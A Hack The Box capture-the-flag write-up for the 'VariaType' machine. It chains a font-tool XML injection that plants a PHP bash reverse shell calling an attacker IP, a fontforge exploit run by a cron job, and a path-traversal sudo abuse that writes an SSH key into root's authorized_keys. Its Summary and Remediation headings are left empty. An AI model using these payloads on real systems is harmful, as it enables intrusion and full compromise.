---
title: VariaType
date: 2026-05-01
category: [HackTheBox, Linux, Web Exploitation]
tags: [nmap, ffuf]
difficulty: Medium
summary: VariaType is an medium rated box on Hack The Box
---

[Link to machine.](https://app.hackthebox.com/machines/VariaType)
# Reconnaissance
Nmap scan:
```bash
nmap -sVC -vv -p- 10.129.33.9 -T4 -oN nmap-full
```
Result:
```bash
# Nmap 7.99 scan initiated Thu Apr 30 22:34:47 2026 as: /usr/lib/nmap/nmap --privileged -sVC -vv -p- -T4 -oN nmap-full 10.129.33.9
Increasing send delay for 10.129.33.9 from 0 to 5 due to 125 out of 312 dropped probes since last increase.
Increasing send delay for 10.129.33.9 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.129.33.9
Host is up, received reset ttl 63 (0.17s latency).
Scanned at 2026-04-30 22:34:52 +07 for 887s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGaryOd6/hnIT9XPtT08U3YwVShW2VnKYno4lQqs0BQ6ePwGDjLxPcQHcEiiKWd0/mvv39jxHUQAgt069vYV8ag=
|   256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILtP5zMi+IdeNc7bOdDPDwFv+HWDAUakOFYbEIvNSp2z
80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://variatype.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 30 22:49:39 2026 -- 1 IP address (1 host up) scanned in 891.51 seconds
```
- port 22: SSH
- port 80: HTTP nginx
Port 80 resolves to variatype.htb.
![](/images/Pasted%20image%2020260430224650.png)
Vhost fuzzing:
```bash
ffuf -u http://variatype.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.variatype.htb" -fc 301 > vhosts
```
I filter code 301 cause I saw too many vhosts returning 301.
```bash
┌──(joichiro㉿joichiro)-[~/Labs/HackTheBox/VariaType]
└─$ cat vhosts          
portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 178ms]
```
![](/images/Pasted%20image%2020260430225254.png)
Directory fuzzing:
```bash
ffuf -u http://variatype.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -v -mc 200-403 > ffuf-
varia
ffuf -u http://portal.variatype.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -v -mc 200-403 
> ffuf-portal-varia
```
VariaType is a service to help build variable fonts.
Noticed it's using `fonttools`, `fontmake`, `gftools`:
![](/images/Pasted%20image%2020260430224718.png)
A brief research for known vulnerables shows CVE-2025-66034 (haven't confirmed yet).
## [CVE-2025-66034](https://github.com/advisories/GHSA-768j-98cg-p3fv)
## Exploitation
`.designspace` payload that I uploaded to the service.
```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
        <axes>
        <!-- XML injection occurs in labelname elements with CDATA sections -->
            <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
                <labelname xml:lang="en"><![CDATA[<?php echo shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.103/44444 0>&1'");?>]]]]><![CDATA[>]]></labelname>
                <labelname xml:lang="fr">MEOW2</labelname>
            </axis>
        </axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
        <sources>
                <source filename="source-light.ttf" name="Light">
                        <location>
                                <dimension name="Weight" xvalue="100"/>
                        </location>
                </source>
                <source filename="source-regular.ttf" name="Regular">
                        <location>
                                <dimension name="Weight" xvalue="400"/>
                        </location>
                </source>
        </sources>
        <variable-fonts>
                <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
                        <axis-subsets>
                                <axis-subset name="Weight"/>
                        </axis-subsets>
                </variable-font>
        </variable-fonts>
        <instances>
                <instance name="Display Thin" familyname="MyFont" stylename="Thin">
                        <location><dimension name="Weight" xvalue="100"/></location>
                        <labelname xml:lang="en">Display Thin</labelname>
                </instance>
        </instances>
</designspace>
```
Here I inject a php reverse shell into `/var/www/portal.variatype.htb/public/files/shell.php`
And I was able to trigger the php script via: `http://portal.variatype.htb/files/shell.php`
# Horizontal movement - getting the shell as user
Since steve is the only user in this machine (as shown in `/home`), I first try to find a way to get a shell as steve first.
Check for files that owned by steve but I was able to read (world readable bit set):
```bash
find / -type f -user steve -perm -o=r -exec ls -la {} \; 2>/dev/null
```
```bash
www-data@variatype:~/portal.variatype.htb/public/files$ find / -type f -user steve -perm -o=r -exec ls -la {} \; 2>/dev/null
<ser steve -perm -o=r -exec ls -la {} \; 2>/dev/null    
-rwxr-xr-- 1 steve steve 2018 Feb 26 07:50 /opt/process_client_submissions.bak
```
reveals a `.bak` file: `/opt/process_client_submissions.bak`
it's a backup file for the font processing pipeline using fontforge:
![](/images/Pasted%20image%2020260503110319.png)
So I suspect that this user steve might be setting a cronjob to run this script to process font files.
Try confirming in crontab:
```bash
www-data@variatype:~/portal.variatype.htb/public/files$ cat /etc/crontab                                                 
cat /etc/crontab                                             
# /etc/crontab: system-wide crontab                          
# Unlike any other crontab you don't have to run the `crontab'                                                    
# command to install the new version when you edit this file 
# and files in /etc/cron.d. These files also have username fields,                                                      
# that none of the other crontabs do.                        
SHELL=/bin/sh                                                
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin                                                         
# Example of job definition:                                 
# .---------------- minute (0 - 59)                          
# |  .------------- hour (0 - 23)                            
# |  |  .---------- day of month (1 - 31)                    
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...    
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat                                  
# |  |  |  |  |                                              
# *  *  *  *  * user-name command to be executed             
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly                                             
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }                     
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }                    
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }                   
# 
```
It not showing in this sytem-wide crontab, so I checked for existence of user-specific crontab:
```bash
www-data@variatype:~/portal.variatype.htb/public/files$ ls -la /var/spool/cron
<.variatype.htb/public/files$ ls -la /var/spool/cron    
total 12
drwxr-xr-x 3 root root    4096 Mar  9 08:29 .
drwxr-xr-x 3 root root    4096 Mar  9 08:29 ..
drwx-wx--T 2 root crontab 4096 Mar  9 08:29 crontabs
www-data@variatype:~/portal.variatype.htb/public/files$ ls -la /var/spool/cron/crontabs
<e.htb/public/files$ ls -la /var/spool/cron/crontabs    
ls: cannot open directory '/var/spool/cron/crontabs': Permission denied
```
So by this I think the script is fired by steve's cronjob. I gave it a try for some known vulnerabilities I found related to fontforge.
## [CVE-2025-15276]
## Exploitation
https://github.com/ahmedreda38/CVE-2025-15276-poc
I can use the script to generate malicious sfd file and move it to `/var/www/portal.variatype.htb/public/files/` and wait for it to process the file to get the shell as steve.
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.103] from (UNKNOWN) [10.129.33.40] 52174
bash: cannot set terminal process group (12749): Inappropriate ioctl for device
bash: no job control in this shell
steve@variatype:/var/www/portal.variatype.htb/public/files$ whoami
whoami
steve
```
And I've got the shell as steve
Check `sudo -l`:
```bash
steve@variatype:~/bin$ sudo -l
sudo -l
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```
steve allowed to run that as root with no password.
## [CVE-2025-47273]()
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class MinimalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open("id_rsa.pub", "rb") as f:
            content = f.read()
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(content)
        print(f"[*] Served payload to {self.client_address[0]}")

port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
print(f"[+] Server listening on port {port}...")
HTTPServer(('0.0.0.0', port), MinimalHandler).serve_forever()
```
Set up a http server that will always return my public key for GET requests.
```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.15.103:8000/%2froot%2f.ssh%2fauthorized_keys2026-05-01 02:35:23,270 [INFO] Attempting to install plugin from: http://10.10.15.103:8000/%2froot%2f.ssh%2fauthorized_keys
2026-05-01 02:35:23,285 [INFO] Downloading http://10.10.15.103:8000/%2froot%2f.ssh%2fauthorized_keys
2026-05-01 02:35:23,651 [INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```
After the installation, I can ssh as root using private key authentication.
```bash
ssh root@10.129.33.40                          
Enter passphrase for key '/home/joichiro/.ssh/id_ed25519': 
Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 1 02:35:59 2026 from 10.10.15.103
root@variatype:~# whoami
root
```
![](/images/Pasted%20image%2020260503113311.png)
# Summary
# Remediation